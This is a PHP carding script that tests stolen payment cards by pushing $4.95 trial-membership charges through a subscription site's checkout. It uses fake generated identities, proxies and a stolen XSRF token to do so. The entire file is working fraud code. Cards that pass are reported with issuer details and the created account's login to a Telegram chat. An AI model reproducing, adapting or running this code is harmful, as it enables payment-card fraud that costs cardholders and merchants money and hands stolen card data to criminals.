<?php

include 'func.php';
error_reporting(0);
set_time_limit(200);
extract($_GET);

    if(!is_dir("cookies")) mkdir("cookies");
    $cookies = getcwd()."/cookies/cookey".rand(10000, 9999999).".txt";

    list($cc, $mm, $yyyy, $cvv) = explode("|", preg_replace('/[^0-9|]+/', '', $_GET['cards']));
    $card = "$cc|$mm|$yyyy|$cvv";
    $cy_success = "Payment method successfully added.";
    $cy_error = "Unexpected error occured!";
    $scc = implode('+', str_split($cc, 4));
    $m = ltrim($mm, "0");
    if ($m === "") {
      $m = "0";
    }
    $yyyy = strlen($yyyy) == 2 ? '20' . $yyyy : $yyyy;
    $yy = substr($yyyy, 2,2);
    $cc1 = substr($cc, 0,4);
    $cc2 = substr($cc, 4,4);
    $cc3 = substr($cc, 8,4);
    $last4 = substr($cc, 12,4);
    $bin = substr($cc, 0,6);

    $first_digit = substr($cc, 0, 1);
    switch ($first_digit) {
        case '4':
            $brand = 'VI';
            $type1 = 'visa';
            break;
        case '5':
            $brand = 'MC';
            $type1 = 'mastercard';
            break;
        case '6':
            $brand = 'AMEX';
            break;
        default:
            $brand = 'Unknown';
    }

function capture($str, $start, $end) {
    $startPos = strpos($str, $start);
    if ($startPos === false) {
        return '';
    }
    $startPos += strlen($start);
    $endPos = strpos($str, $end, $startPos);
    if ($endPos === false) {
        return '';
    }
    return substr($str, $startPos, $endPos - $startPos);
}

$randomShits = file_get_contents('https://namegenerator.in/assets/refresh.php?location=united-states');
    $data = json_decode($randomShits, true);
    $firstname = explode(" ", $data['name'])[0];
    $lastname = explode(" ", $data['name'])[1];
    $email = $data['email']['address'];
    $street = $data['street1'];
    $local = capture($randomShits, '"street2":', ',"phone"');
    $city = capture($local, '"', ',');
    $state = capture($local, ', ', ' ');
    $phone = str_replace("-", "", $data['phone']);
    $postcode = capture($local, "$state" , '"');                                                             
    $zipApiUrl = 'http://ziptasticapi.com/' . $postcode;
    $stateISO = json_decode(file_get_contents($zipApiUrl))->state;

$arr = [
    'AL' => ['Alabama', 1],'AK' => ['Alaska', 2], 'AS' => ['American Samoa', 3],'AZ' => ['Arizona', 4],'AR' => ['Arkansas', 5],
    'AE' => ['Armed Forces Africa', 6],'AA' => ['Armed Forces Americas', 7], 'AE' => ['Armed Forces Canada', 8],'AE' => ['Armed Forces Europe', 9],
    'AE' => ['Armed Forces Middle East', 10],'AP' => ['Armed Forces Pacific', 11],'CA' => ['California', 12],'CO' => ['Colorado', 13],
    'CT' => ['Connecticut', 14],'DE' => ['Delaware', 15],'DC' => ['District of Columbia', 16],'FM' => ['Federated States Of Micronesia', 17],
    'FL' => ['Florida', 18],'GA' => ['Georgia', 19],'GU' => ['Guam', 20],'HI' => ['Hawaii', 21],'ID' => ['Idaho', 22],'IL' => ['Illinois', 23],
    'IN' => ['Indiana', 24],'IA' => ['Iowa', 25],'KS' => ['Kansas', 26],'KY' => ['Kentucky', 27],'LA' => ['Louisiana', 28],
    'ME' => ['Maine', 29],'MH' => ['Marshall Islands', 30],'MD' => ['Maryland', 31],'MA' => ['Massachusetts', 32],'MI' => ['Michigan', 33],
    'MN' => ['Minnesota', 34],'MS' => ['Mississippi', 35],'MO' => ['Missouri', 36],'MT' => ['Montana', 37],'NE' => ['Nebraska', 38],
    'NV' => ['Nevada', 39],'NH' => ['New Hampshire', 40],'NJ' => ['New Jersey', 41],'NM' => ['New Mexico', 42],'NY' => ['New York', 43],
    'NC' => ['North Carolina', 44],'ND' => ['North Dakota', 45],'MP' => ['Northern Mariana Islands', 46],'OH' => ['Ohio', 47],'OK' => ['Oklahoma', 48],
    'OR' => ['Oregon', 49],'PW' => ['Palau', 50],'PA' => ['Pennsylvania', 51],'PR' => ['Puerto Rico', 52],'RI' => ['Rhode Island', 53],
    'SC' => ['South Carolina', 54],'SD' => ['South Dakota', 55],'TN' => ['Tennessee', 56],'TX' => ['Texas', 57],'UT' => ['Utah', 58],
    'VT' => ['Vermont', 59],'VI' => ['Virgin Islands', 60],'VA' => ['Virginia', 61],'WA' => ['Washington', 62],'WV' => ['West Virginia', 63],
    'WI' => ['Wisconsin', 64],'WY' => ['Wyoming', 65],   
];

$state = '';

foreach ($arr as $key => $value) {
    if ($key == $stateISO) {
        $state = $value[0];
        $regionId = $value[1];
        break;
    }
}    


$count = 0;
ret:
$xemail = $_GET['xemail'] ?? '';
$bin_data = get_bin_info($cc);
$info = $bin_data['info'];
$issuer = $bin_data['issuer'];
$country_card = $bin_data['country_card'];
$maxRetries = 10;
for ($attempt = 1; $attempt <= $maxRetries; $attempt++) {
$cookieFile = __DIR__ . '/cookiejar.txt';

$url = "https://www.phoenixgrp.com/Join/?template=join_form_sssh_r&site=SSSH&joinoption=trial&oqs=";

$headers = [
    "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "accept-language: en-US,en;q=0.9",
    "priority: u=0, i",
    "referer: https://sssh.com/",
    "sec-ch-ua: \"Google Chrome\";v=\"137\", \"Chromium\";v=\"137\", \"Not/A)Brand\";v=\"24\"",
    "sec-ch-ua-mobile: ?0",
    "sec-ch-ua-platform: \"Windows\"",
    "sec-fetch-dest: document",
    "sec-fetch-mode: navigate",
    "sec-fetch-site: cross-site",
    "sec-fetch-user: ?1",
    "upgrade-insecure-requests: 1",
    "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36"
];

$ch = curl_init($url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_PROXY, $proxylocate);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxylogins);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile); 
$response = curl_exec($ch);
curl_close($ch);

preg_match_all('/Set-Cookie:\s*([^\r\n]*)/i', $response, $matches);
$cookies = $matches[1];
$xsrf_token_encoded = null;

foreach ($cookies as $cookie) {
    if (strpos($cookie, 'XSRF-TOKEN=') === 0) {
        $parts = explode(';', $cookie);
        $keyValue = explode('=', $parts[0], 2);
        if (isset($keyValue[1])) {
            $xsrf_token_encoded = $keyValue[1];
            break;
        }
    }
}

if ($xsrf_token_encoded !== null) {
    $xsrf_token = urldecode($xsrf_token_encoded);
    #echo '<span class="text text-success">xsrf_token</span> <span class="text text-success">➔ '.$xsrf_token.'</span><br>';
} else {
    echo '<span class="text text-danger">Decline</span> <span class="text text-danger">➔ '.$card.' ➔ XSRF-TOKEN not found</span><br>';
    exit;
}

$pay_url = "https://www.phoenixgrp.com/process";
$pay_headers = [
    "accept: application/json, text/plain, */*",
    "accept-language: en-US,en;q=0.9",
    "content-type: application/json",
    "origin: https://www.phoenixgrp.com",
    "priority: u=1, i",
    "referer: https://www.phoenixgrp.com/Join?template=join_form_sssh_r&site=SSSH&joinoption=trial&oqs=",
    "sec-ch-ua: \"Google Chrome\";v=\"137\", \"Chromium\";v=\"137\", \"Not/A)Brand\";v=\"24\"",
    "sec-ch-ua-mobile: ?0",
    "sec-ch-ua-platform: \"Windows\"",
    "sec-fetch-dest: empty",
    "sec-fetch-mode: cors",
    "sec-fetch-site: same-origin",
    "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
    "x-requested-with: XMLHttpRequest",
    "x-xsrf-token: {$xsrf_token}"
];

$pay_json_data = [
    "site" => "SSSH",
    "campaign" => "",
    "program" => "",
    "webmaster" => "",
    "action" => "process",
    "merchant_id" => "",
    "processor_id" => "",
    "member_keyword" => "",
    "extra" => "",
    "return_url" => "",
    "post_back_url" => "",
    "affid" => "",
    "type" => "2dayssh",
    "password" => "deltahaven",
    "username" => $firstname . $lastname,
    "email" => $email,
    "credit_card_number" => $cc,
    "credit_card_expiration_month" => $mm,
    "credit_card_expiration_year" => $yy,
    "cvv2" => $cvv,
    "firstname" => $firstname,
    "lastname" => $lastname,
    "postal_code" => "94545",
    "country" => "US"
];

$ch = curl_init($pay_url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $pay_headers);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($pay_json_data));
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile); 
curl_setopt($ch, CURLOPT_PROXY, $proxylocate);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxylogins);
$pay_response = curl_exec($ch);
curl_close($ch);
$response_json = json_decode($pay_response, true);
$err = $response_json['message'] ?? '';
#echo '<span class="text text-danger">pay_response</span> <span class="text text-danger">➔ '.$pay_response.'</span><br>';
#echo '<span class="text text-danger">pay_response</span> <span class="text text-danger">➔ '.$response_json.'</span><br>';
#echo '<span class="text text-danger">err</span> <span class="text text-danger">➔ '.$err.'</span><br>';

if (isset($response_json['redirect_url'])) {
    echo '<span class="text text-success">Charge</span> <span class="text text-success">➔ '.$card.' ➔ ✔️ You’ve been billed $4.95 — your receipt has been sent to your Telegram 📤. R: [ '.$attempt.' ]</span><br>';
    $message = "🔊<b>LIVE CARD DETECTED!</b>\n" .
    "✉️ <b>CARD:</b> $card\n" .
    "🔍 <b>STATUS:</b> You’ve been billed \$4.95 ✔️\n" .
    "🛡️ <b>Username:</b> " . $firstname . $lastname . "\n" .
    "🔍 <b>Password:</b> deltahaven\n" .
    "🔗 <b>Site:</b> <a href=\"https://sssh.com/membersv5/\">🔎 View Site</a>\n\n" .
    "ℹ️ <b>🧾 Payment Details</b>\n" .
    "ℹ️ <b>Info:</b> $info\n" .
    "🏦 <b>Issuer:</b> $issuer\n" .
    "🌍 <b>Country:</b> $country_card\n" .
    "🌐 <b>CREATED BY:</b> I AM ATOMIC LANG MALAKAS!";
    sendToTelegram($message,$telegram);
} elseif (isset($response_json['message']) && strpos(strtolower($response_json['message']), 'declined') !== false) {
    echo '<span class="text text-danger">Decline</span> <span class="text text-danger">➔ '.$card.' ➔ '.$err.' R: [ '.$attempt.' ]</span><br>';
} else {
    if ($attempt == $maxRetries) {
            echo '<span class="text text-danger">Decline</span> <span class="text text-danger">➔ '.$card.' ➔ Card check failed after '.$attempt.' attempts.</span><br>';
        }
        sleep(2);
        continue; 
}
break; 
}
unset($ch);
unlink($cookies);
flush();
ob_flush();
ob_end_flush();

?>